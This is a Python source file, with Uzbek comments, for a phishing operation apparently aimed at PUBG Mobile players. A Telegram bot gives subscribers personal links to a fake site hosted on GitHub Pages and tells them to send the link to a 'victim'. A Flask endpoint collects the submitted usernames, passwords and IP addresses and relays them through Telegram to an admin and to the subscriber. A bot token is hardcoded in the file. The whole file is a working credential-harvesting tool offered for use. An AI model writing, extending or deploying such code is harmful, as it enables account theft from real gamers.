import logging
import asyncio
import threading
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request, jsonify
from flask_cors import CORS 

# --- SOZLAMALAR ---
TOKEN = "8310992834:AAFIhrXHPCjiuvGOHI8XjiWom7k07mlUSxo"
ADMIN_ID = 8250478755
CHANNEL_USERNAME = "@abdurazoqov606"
CREATOR_USERNAME = "@abdurozoqov_edits"

# GITHUB SAYTINGIZ MANZILI (Oxirida / bo'lsin)
# Masalan: https://sizning-nik.github.io/repo-nomi/
GITHUB_SITE_URL = "https://pubgmobile-uc.github.io/MOD/"

# --- FLASK SERVER (Render uchun) ---
app = Flask(__name__)
CORS(app) # GitHubdan kelgan so'rovlarga ruxsat

# 1. UPTIMEROBOT UCHUN YO'L (Bot uxlamasligi uchun)
@app.route('/')
def home():
    return "Bot va Server 24/7 ishlamoqda! (UptimeRobot uchun)"

# 2. Login qabul qilish
@app.route('/login_submit', methods=['POST'])
def login_submit():
    try:
        data = request.json
        user_id = data.get('user_id')
        method = data.get('method')
        username = data.get('username')
        password = data.get('password')
        ip = data.get('ip')
        
        msg = (
            f"🔥 <b>YANGI O'LJA!</b>\n\n"
            f"📥 <b>Kirish:</b> {method.upper()}\n"
            f"👤 <b>Login:</b> <code>{username}</code>\n"
            f"🔑 <b>Parol:</b> <code>{password}</code>\n"
            f"🌍 <b>IP:</b> {ip}\n"
            f"🆔 <b>User ID:</b> {user_id}\n\n"
            f"👨‍💻 <b>Asoschi:</b> {CREATOR_USERNAME}"
        )

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # Adminga
        try: loop.run_until_complete(bot.send_message(ADMIN_ID, f"👑 <b>Admin uchun:</b>\n{msg}", parse_mode="HTML"))
        except: pass

        # Userga
        if user_id and str(user_id).isdigit():
            try: loop.run_until_complete(bot.send_message(int(user_id), f"✅ <b>Sizning ma'lumotingiz:</b>\n{msg}", parse_mode="HTML"))
            except: pass

        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

def run_flask():
    app.run(host="0.0.0.0", port=5000)

# --- TELEGRAM BOT QISMI ---
bot = Bot(token=TOKEN)
dp = Dispatcher()

async def check_sub(user_id):
    try:
        m = await bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return m.status in ['creator', 'administrator', 'member']
    except: return False

@dp.message(F.text == "/start")
async def start_cmd(msg: types.Message):
    uid = msg.from_user.id
    if await check_sub(uid):
        await give_link(msg)
    else:
        await msg.answer(
            f"👋 <b>Assalomu alaykum, {msg.from_user.first_name}!</b>\n\n"
            f"💎 <b>PUBG Akkaunt Chopish Botiga xush kelibsiz.</b>\n"
            f"👨‍💻 <b>Asoschi:</b> {CREATOR_USERNAME}\n\n"
            f"⚠️ Botdan foydalanish va Link olish uchun kanalimizga a'zo bo'ling:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📢 Kanalga a'zo bo'lish", url=f"https://t.me/{CHANNEL_USERNAME.replace('@','')}")],
                [InlineKeyboardButton(text="✅ Tekshirish", callback_data="check")]
            ]),
            parse_mode="HTML"
        )

@dp.callback_query(F.data == "check")
async def check_btn(call: types.CallbackQuery):
    if await check_sub(call.from_user.id):
        await call.message.delete()
        await give_link(call.message)
    else:
        await call.answer("❌ Hali kanalga a'zo bo'lmadingiz!", show_alert=True)

async def give_link(message: types.Message):
    # Linkni tayyorlash
    link = f"{GITHUB_SITE_URL}?user_id={message.chat.id}"
    
    await message.answer(
        f"✅ <b>Tabriklaymiz! Siz muvaffaqiyatli ro'yxatdan o'tdingiz.</b>\n\n"
        f"👨‍💻 <b>Asoschi:</b> {CREATOR_USERNAME}\n\n"
        f"👇 <b>Mana sizning shaxsiy havolangiz (Nusxalab oling):</b>\n\n"
        f"<code>{link}</code>\n\n"
        f"👆 <i>Ustiga bir marta bossangiz, nusxalanadi! Shu linkni qurbonga tashlang.</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🚀 SAYTGA KIRISH", url=link)]
        ]),
        parse_mode="HTML"
    )

async def main():
    threading.Thread(target=run_flask).start()
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())